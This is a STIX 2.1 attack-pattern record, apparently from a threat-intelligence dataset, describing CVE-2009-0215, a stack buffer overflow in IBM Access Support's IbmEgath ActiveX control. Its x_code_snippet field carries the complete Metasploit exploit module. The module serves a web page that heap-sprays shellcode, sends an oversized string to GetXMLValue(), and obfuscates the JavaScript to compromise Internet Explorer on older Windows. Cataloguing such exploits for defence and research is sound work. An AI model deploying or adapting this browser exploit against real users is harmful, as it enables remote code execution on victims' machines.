{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--271c1b21-da24-40e4-b0ed-e81054a13754",
    "created": "2024-08-14T16:43:01.201037Z",
    "modified": "2024-08-14T16:43:01.201041Z",
    "name": "IBM Access Support ActiveX Control Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in IBM Access Support. When sending an overly long string to the GetXMLValue() method of IbmEgath.dll (3.20.284.0) an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ibmegath_getxmlvalue.rb",
            "external_id": "ibmegath_getxmlvalue.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-0215"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'IBM Access Support ActiveX Control Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in IBM Access Support. When\n        sending an overly long string to the GetXMLValue() method of IbmEgath.dll\n        (3.20.284.0) an attacker may be able to execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-0215' ],\n          [ 'OSVDB', '52958' ],\n          [ 'BID', '34228' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0-SP3 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => '' } ]\n        ],\n      'DisclosureDate' => '2009-03-24',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload.\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Encode the shellcode.\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    ret = Rex::Text.uri_encode(Metasm::Shellcode.assemble(Metasm::Ia32.new, \"or cl,[edx]\").encode_string * 2)\n\n    fill = rand_text_english(rand(12) + 1)\n\n    js = %Q|\n      try {\n        var evil_string = \"\";\n        var index;\n        var sumthang;\n        var vulnerable = new ActiveXObject('IbmEgath.IbmEgathCtl.1');\n        var my_unescape = unescape;\n        var shellcode = '#{shellcode}';\n        #{js_heap_spray}\n        sprayHeap(my_unescape(shellcode), 0x0a0a0a0a, 0x40000);\n        for (index = 0; index < 4024; index++) {\n          evil_string = evil_string + my_unescape('#{ret}');\n        }\n        vulnerable.RunEgatherer('#{fill}');\n        var sumthang = vulnerable.GetXMLValue('#{fill}.xml', evil_string);\n      } catch( e ) { window.location = 'about:blank' ; }\n    |\n\n    opts = {\n      'Strings' => true,\n      'Symbols' => {\n        'Variables' => [\n          'vulnerable',\n          'shellcode',\n          'my_unescape',\n          'index',\n          'evil_string',\n          'sumthang',\n        ]\n      }\n    }\n    js = ::Rex::Exploitation::ObfuscateJS.new(js, opts)\n    js.update_opts(js_heap_spray.opts)\n    js.obfuscate(memory_sensitive: true)\n    content = %Q|<html>\n<body>\n<script><!--\n#{js}\n//</script>\n</body>\n</html>\n|\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-03-24",
    "x_mitre_platforms": [
        "win'"
    ]
}